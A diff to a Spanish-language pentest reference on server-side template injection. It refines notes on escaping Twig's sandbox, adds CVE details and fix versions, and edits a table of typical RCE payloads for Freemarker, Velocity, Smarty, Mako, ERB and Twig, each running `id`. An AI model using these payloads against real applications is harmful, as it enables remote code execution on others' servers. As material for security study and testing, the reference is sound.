@@ -64,16 +64,16 @@ El `SandboxedEnvironment` bloquea el acceso a atributos "inseguros" (los que emp
 
 La `SandboxPolicy` de Twig limita tags/filtros/funciones permitidos. Vías de evasión:
 
-- **Filtros permitidos con callback**: `filter`, `map`, `reduce` aceptan una función PHP → `{{ ['id']|map('system') }}` ejecuta aunque `system` no esté en la whitelist. Funciona con el sandbox **no** global; con `SandboxPolicy` global y Twig parcheado (post-`CVE-2022-23614`) se exige un `Closure`, no un string-callback.
+- **Filtros permitidos con callback**: `filter`, `map`, `reduce` aceptan una función PHP → `{{ ['id']|map('system') }}` ejecuta aunque `system` no esté en la whitelist. Funciona con el sandbox **no** global; bajo `SandboxPolicy` global, `filter`/`map`/`reduce` ya exigen un `Closure` (no un string-callback), **con independencia de `CVE-2022-23614`** — ese CVE parcheó el filtro `sort`, que era la excepción que no lo validaba (*"disallow non-closures in the `sort` filter when the sandbox is enabled"*).
 - **`_self.env`** (Twig **1.x**): `{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}`.
-- **CVEs de escape del sandbox**: `CVE-2024-45411` (incluir una plantilla precargada fuera del contexto sandbox → **RCE**) y `CVE-2026-46635` (el filtro `column` lee propiedades fuera de la allowlist → **fuga de datos**, severidad Low; no RCE). El sandbox de Twig, como el de Jinja2, ha caído varias veces — comprueba la versión.
+- **CVEs de escape del sandbox**: `CVE-2024-45411` (incluir una plantilla precargada fuera del contexto sandbox → **RCE**); `CVE-2026-46635` (el filtro `column` lee propiedades fuera de la allowlist → **fuga de datos**; GitHub la valora *Low*, aunque el CVSS 3.1 de NVD la sube a *Medium*; no RCE; fix en Twig **3.26.0**); y su follow-up `CVE-2026-48808` (bypass residual del parche anterior, solo bajo sandboxing vía `SourcePolicyInterface`; CVSS 3.1 = 7.5 *High*; fix en Twig **3.27.0**). El sandbox de Twig, como el de Jinja2, ha caído varias veces — comprueba la versión.
 
 # Otros motores (referencia rápida)
 
 | Motor | Lenguaje | Payload RCE típico |
 | - | - | - |
 | Freemarker | Java | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
-| Velocity | Java | `#set($e=...)$e.getClass()...` (reflexión) |
+| Velocity | Java | reflexión Java: `#set($e="e")$e.getClass().forName("java.lang.Runtime")...` — cadena completa en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#velocity) |
 | Smarty | PHP | `{system('id')}` / `{php}...{/php}` (según versión) |
 | Mako | Python | `${self.module.cache.util.os.system("id")}` |
 | ERB | Ruby | `<%= \`id\` %>` |
